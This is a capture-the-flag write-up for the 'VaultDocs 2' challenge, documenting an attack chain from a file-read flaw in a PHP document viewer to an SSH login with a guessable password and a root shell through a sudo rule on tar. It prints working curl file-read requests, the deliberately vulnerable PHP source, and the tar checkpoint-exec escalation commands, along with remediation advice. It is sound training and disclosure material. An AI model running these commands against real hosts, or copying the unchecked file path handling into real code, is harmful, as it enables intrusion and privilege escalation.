# VaultDocs 2 — Writeup

**"The internal documentation server was supposed to be temporary."**

| | |
|---|---|
| **Challenge** | VaultDocs - 2 (KPMG CTF) |
| **Points** | 10 |
| **Category** | Web / Linux (multi-service) |
| **Goal** | Get to root |
| **Target Web** | `http://kicyber-d6e8a2dfaeea-vaultdocs-2-0-0.chals.io` |
| **Target SSH** | `ssh://0.cloud.chals.io:33942` |
| **Flag format** | `KPMG_CTF{...}` |
| **Result** | Machine fully compromised (`uid=0(root)`). Root flag retrieved. |
| **Date** | 2026-10-11 |

---

## 1. Executive Summary

VaultDocs is a small PHP "document portal" (Apache 2.4.68 on Debian 12) that lets users preview
internal documents. The preview functionality takes a user-controlled `page` parameter and passes it
straight into `file_get_contents()` with **no path-traversal protection**, giving a Local File
Inclusion / Arbitrary File Read (LFI) vulnerability in `index.php`.

The same host exposes SSH for "remote administration". The LFI was used to confirm the local account
`vboxuser`; the account was protected by a trivial, guessable password (`changeme`), allowing SSH
login. `vboxuser` had an over-permissive `sudo` rule — `(root) NOPASSWD: /bin/tar` — which was
escalated to a full root shell using the GTFOBins `tar --checkpoint-action=exec` trick.

**Attack chain:**

```
Web (LFI in index.php)  ──►  /etc/passwd  ──►  user "vboxuser"
        │
        └──► weak SSH password "changeme"  ──►  SSH shell (vboxuser)
                     │
                     └──► sudo NOPASSWD /bin/tar  ──►  root shell (uid=0)  ──►  /root/root.txt
```

**Result:** Complete compromise of the host (`uid=0(root)`) and retrieval of the root flag.

---

## 2. Target Information

| Item | Value |
|---|---|
| Web server | Apache/2.4.68 (Debian) behind openresty/1.27.1.2 (HTTP→HTTPS 301) |
| App | "VaultDocs – Secure Document Portal", version badge `v2.4.1`, PHP |
| SSH server | `SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u10` |
| SSH host | `0.cloud.chals.io` → `165.227.210.30`, port `33942` |
| OS | Debian GNU/Linux 12 (bookworm); kernel 6.8.0-136-generic (container host) |
| Container | hostname `ddc07d8eb024` |
| Local users | `root` (no SSH login), `www-data`, `vboxuser` (uid 1000) |
| Listening services | `:22` (sshd), `:80` (apache2), docker DNS |

---

## 3. Step 1 — Reconnaissance

Two endpoints were provided: an HTTP(S) URL and an SSH port.

```bash
# HTTP (port 80) redirects to HTTPS, fronted by openresty
$ curl -s -i http://kicyber-d6e8a2dfaeea-vaultdocs-2-0-0.chals.io/
HTTP/1.1 301 Moved Permanently
Server: openresty/1.27.1.2
Location: https://kicyber-d6e8a2dfaeea-vaultdocs-2-0-0.chals.io/

# HTTPS (port 443) is served by Apache
$ curl -sk -i https://kicyber-d6e8a2dfaeea-vaultdocs-2-0-0.chals.io/
HTTP/1.1 200 OK
Server: Apache/2.4.68 (Debian)
Content-Type: text/html; charset=UTF-8

# SSH banner
$ nc 0.cloud.chals.io 33942
SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u10
```

The homepage is a mostly static portal with a "Document Viewer" and four "Quick Access" documents
(`docs/readme`, `docs/about`, `docs/contact`, `docs/changelog`). Each document is submitted via a
**POST form** to `/` with a hidden field named `page`. Navigation links use `/?page=docs/about`
(GET). No admin panel, upload, or API was found.

---

## 4. Step 2 — Local File Inclusion in `index.php`

The `page` parameter was tested directly. **POST** requests render the file contents into a
`<div class="viewer">` block. A traversal/absolute path returns arbitrary file contents:

```bash
$ curl -sk -X POST --data-urlencode "page=/etc/passwd" \
       https://kicyber-d6e8a2dfaeea-vaultdocs-2-0-0.chals.io/
...
<div class="viewer">root:x:0:0:root:/root:/bin/bash
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
vboxuser:x:1000:1000::/home/vboxuser:/bin/bash
</div>
```

The application's own source is world-readable and was exfiltrated through the same LFI. Because the
sink is `file_get_contents()` (not `include()`), PHP wrappers such as `php://filter` are rejected by
the `file_exists()` pre-check — this is a **read-only** LFI, no direct RCE via the web app.

```php
<?php
$allowed_dir = realpath('/var/www/html/docs');   // declared but never enforced
$error = '';
$content = '';
$requested = '';

if (isset($_POST['page'])) {
    $page = $_POST['page'];
    $requested = htmlspecialchars($page);
    // Intentionally vulnerable - no path traversal protection
    $filepath = '/var/www/html/' . $page;
    if (file_exists($filepath) && is_file($filepath)) {
        $content = file_get_contents($filepath);
    } else {
        // Still vulnerable to /etc/passwd etc via absolute-like paths
        if (file_exists($page) && is_file($page)) {
            $content = file_get_contents($page);
        } else {
            $error = "Document not found";
        }
    }
}
?>
...
<div class="viewer"><?= htmlspecialchars($content) ?></div>
```

The author even left an explicit `// Intentionally vulnerable` comment, confirming the LFI is the
intended foothold. The real value of the LFI here was confirming the username **`vboxuser`** and
that the host exposes SSH.

*(Full evidence: `evidence/02_lfi_passwd.txt`, `evidence/03_index_php_source.txt`.)*

---

## 5. Step 3 — Weak SSH Credentials → User Shell

`/etc/passwd` confirmed a single interactive user, `vboxuser`. Given the "temporary internal build"
theme, the same trivial password used in the sibling challenge was tried and succeeded.

```bash
$ ssh vboxuser@0.cloud.chals.io -p 33942     # password: changeme
$ id; hostname; uname -a
uid=1000(vboxuser) gid=1000(vboxuser) groups=1000(vboxuser)
ddc07d8eb024
Linux ddc07d8eb024 6.8.0-136-generic #136~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC ... x86_64 GNU/Linux
```

*(Full evidence: `evidence/04_ssh_login.txt`.)*

> Note: unlike VaultDocs-1, on this instance the `USER_FLAG` environment variable was **not**
> provisioned, so `/home/vboxuser/user.txt` holds the build-time placeholder
> `FLAG{default_user_flag}`. Only `ROOT_FLAG` was injected — see §7.

---

## 6. Step 4 — Privilege Escalation via `sudo tar`

Enumerating sudo rights revealed a dangerous NOPASSWD rule:

```bash
$ sudo -n -l
User vboxuser may run the following commands on ddc07d8eb024:
    (root) NOPASSWD: /bin/tar
```

`tar` is a classic GTFOBins privilege-escalation binary. Its `--checkpoint-action=exec=` directive
runs an arbitrary command as the user running `tar` — here **root**, because it is invoked through
`sudo`:

```bash
sudo /bin/tar -cf /dev/null /dev/null \
     --checkpoint=1 --checkpoint-action=exec="/bin/sh -c 'id; whoami'"
```

Output:

```
uid=0(root) gid=0(root) groups=0(root)
root
```

Root escalation was complete. A helper script (`/tmp/probe.sh`) was uploaded over SFTP and executed
through the same checkpoint action to collect the flag and environment.

*(Full evidence: `evidence/05_sudo_l.txt`, `evidence/06_root_proof.txt`, `root_probe.sh`,
`run_remote.py`, `evidence/root_probe_output.txt`.)*

---

## 7. Step 5 — Root Flag

Reading the root-only flag through the root context:

```bash
sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 \
     --checkpoint-action=exec="/bin/sh -c 'cat /root/root.txt'"
```

```
KPMG_CTF{MamhP_3IBGs1INvwz7Hk03NJ0KbOwPNk48rUjjEvHTWk}
```

The container entrypoint generates both flags from environment variables at startup:

```bash
# /entrypoint.sh
: "${USER_FLAG:=FLAG{default_user_flag}}"
: "${ROOT_FLAG:=FLAG{default_root_flag}}"

printf '%s\n' "$USER_FLAG" > /home/vboxuser/user.txt
printf '%s\n' "$ROOT_FLAG" > /root/root.txt

chown vboxuser:vboxuser /home/vboxuser/user.txt; chmod 400 /home/vboxuser/user.txt
chown root:root /root/root.txt;               chmod 400 /root/root.txt
```

The PID 1 environment confirmed only `ROOT_FLAG` was injected:

```
HOSTNAME=ddc07d8eb024
PWD=/
ROOT_FLAG=KPMG_CTF{MamhP_3IBGs1INvwz7Hk03NJ0KbOwPNk48rUjjEvHTWk}
HOME=/root
SHLVL=0
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

So the real (submittable) flag is the **root flag**; the user flag is a platform placeholder.

*(Full evidence: `evidence/07_root_flag.txt`, `evidence/08_user_flag.txt`,
`evidence/root_probe_output.txt`.)*

---

## 8. Vulnerability Analysis

| # | Issue | Severity | Location |
|---|---|---|---|
| 1 | Local File Inclusion / Arbitrary File Read (no path validation, `file_get_contents`) | High | `POST /` → `page` in `index.php` |
| 2 | Weak/default SSH password (`changeme`) | Critical | `vboxuser` account |
| 3 | Sudo misconfiguration: `NOPASSWD: /bin/tar` enables trivial root escalation | Critical | `sudoers` for `vboxuser` |
| 4 | Missing `USER_FLAG` provisioning → placeholder left in `/home/vboxuser/user.txt` | Info/deployment | `/entrypoint.sh` |

**Root cause chain:** an unsanitised file-read parameter on the web tier leaked user/system
information, which combined with a guessable administrative credential and an over-privileged
`sudo` rule allowed a full host compromise. Each individually "low" finding chained into root.

---

## 9. Impact

An unauthenticated remote attacker can:

1. Read arbitrary world-accessible files on the web server (source code, configuration, system
   files) — information disclosure and reconnaissance.
2. Log in to the server over SSH as `vboxuser` using a trivial password.
3. Escalate to **root** with a one-line `tar` command.
4. Fully control the host: read all files (including both flags), install persistence, pivot to
   other internal services.

This is a complete compromise of the documentation server.

---

## 10. Remediation

1. **Fix the LFI** — never pass user input to filesystem functions. Resolve paths with
   `realpath()` and enforce that the resolved path stays within an allow-list directory
   (`str_starts_with($real, $base . DIRECTORY_SEPARATOR)`), and/or use an explicit map of document
   IDs → filenames. Remove the `$_POST['page']` sink entirely.
2. **Disable weak authentication** — enforce strong passwords, rate-limit/limit SSH attempts
   (`MaxAuthTries`, fail2ban), prefer key-based auth, and disable password auth where possible.
3. **Least privilege for sudo** — remove `NOPASSWD: /bin/tar`; `tar` (like all GTFOBins binaries)
   can execute commands. Grant only the specific, non-interpreter command required, with a
   password and a tightly-scoped argument policy.
4. **Harden the image** — run the web tier with a read-only filesystem, drop unused services, keep
   secrets out of the web root, and ensure flag/secret environment variables are provisioned
   securely (and that no placeholder secrets remain if provisioning fails).
5. **Defence in depth** — ship PHP with `open_basedir`, disable dangerous functions, add WAF rules
   for traversal patterns, and monitor for `../` sequences.

---

## 11. Flags

| Flag | Value | Status |
|---|---|---|
| Root flag (`/root/root.txt`) | `KPMG_CTF{MamhP_3IBGs1INvwz7Hk03NJ0KbOwPNk48rUjjEvHTWk}` | ✅ Retrieved |
| User flag (`/home/vboxuser/user.txt`) | *(placeholder `FLAG{default_user_flag`)* | ⚠️ `USER_FLAG` not provisioned by platform |

---

## 12. Reproduction (Quick Commands)

```bash
BASE="https://kicyber-d6e8a2dfaeea-vaultdocs-2-0-0.chals.io"

# 1) LFI -> confirm user
curl -sk -X POST --data-urlencode "page=/etc/passwd" "$BASE/"

# 2) SSH with weak password
ssh vboxuser@0.cloud.chals.io -p 33942        # password: changeme

# 3) sudo check
sudo -n -l                                     # (root) NOPASSWD: /bin/tar

# 4) Privilege escalation -> root
sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 \
     --checkpoint-action=exec="/bin/sh -c 'id; whoami'"

# 5) Read the root flag
sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 \
     --checkpoint-action=exec="/bin/sh -c 'cat /root/root.txt'"
```

Helper used for automated SSH (no `sshpass` on the box):

```bash
python3 ssh_run.py changeme 'id; hostname'                 # run a command as vboxuser
python3 run_remote.py root_probe.sh                        # upload + run probe as root via tar
```

---

## 13. Timeline

| Time (IST) | Action |
|---|---|
| 01:59 | Recon — HTTP redirect, HTTPS headers, SSH banner captured |
| 01:59 | Discovered POST `page` sink; confirmed LFI (`/etc/passwd`) |
| 02:00 | Exfiltrated `index.php` source; confirmed intentional traversal |
| 02:02 | SSH `vboxuser:changeme` succeeds; shell obtained |
| 02:02 | `sudo -n -l` shows `NOPASSWD: /bin/tar` |
| 02:02 | Escalated to root via `tar --checkpoint-action=exec`; read `/root/root.txt` |
| 02:03 | Confirmed `ROOT_FLAG` set / `USER_FLAG` missing (deployment note) |

---

## 14. Key Findings Summary

* **Initial access:** Arbitrary File Read (LFI) via `POST page=` in `index.php`.
* **Lateral/vertical:** Weak SSH password `changeme` for `vboxuser`; sudo GTFOBins `tar`.
* **Escalation:** `sudo tar --checkpoint-action=exec=` → `uid=0(root)`.
* **Root flag:** `KPMG_CTF{MamhP_3IBGs1INvwz7Hk03NJ0KbOwPNk48rUjjEvHTWk}`.
* **User flag:** placeholder (`USER_FLAG` not provisioned).

---

## 15. Files in this folder

```
VaultDocs2/
├── VaultDocs-2-writeup.md        # this report
├── home.html                     # captured portal homepage
├── ssh_run.py                    # run a command as vboxuser over SSH (paramiko)
├── run_remote.py                 # upload probe + execute as root via sudo tar
├── root_probe.sh                 # root-side enumeration/flag-collection script
└── evidence/
    ├── 01_http_headers.txt       # HTTP 301, HTTPS 200, SSH banner
    ├── 02_lfi_passwd.txt         # LFI read of /etc/passwd (confirms vboxuser)
    ├── 03_index_php_source.txt   # index.php source revealed via LFI
    ├── 04_ssh_login.txt          # SSH login as vboxuser (id/hostname/uname)
    ├── 05_sudo_l.txt             # sudo rights: NOPASSWD /bin/tar
    ├── 06_root_proof.txt         # uid=0(root) via tar checkpoint action
    ├── 07_root_flag.txt          # root flag
    ├── 08_user_flag.txt          # user.txt (placeholder)
    └── root_probe_output.txt     # consolidated root-side output
```

---

*Writeup generated during an authorised CTF engagement on the chals.io VaultDocs 2 instance.*
